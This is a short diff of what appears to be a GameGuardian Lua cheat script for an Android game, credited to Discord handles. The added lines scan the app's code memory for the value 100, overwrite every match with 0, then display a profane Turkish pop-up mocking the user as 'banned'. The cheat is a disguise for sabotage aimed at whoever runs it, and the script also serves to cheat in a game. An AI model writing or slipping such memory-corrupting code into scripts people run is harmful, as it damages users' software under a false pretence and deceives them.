@@ -1,4 +1,11 @@
 --discord.gg/wila ----- Made By 🔱 LasTPoinT#4361 & Wilz#0422 🔱
-WRSK = 1
+WRSK = 0
 Name = {"Karlos"}
 Token = {"800"}
+gg.setRanges(gg.REGION_CODE_APP)
+gg.searchNumber("100", 16)
+gg.getResults(100000)
+gg.editAll("0", 16)
+gg.clearResults()
+gg.sleep(10000)
+gg.alert("Ban Yedin Orospu Çocuğu 😂")
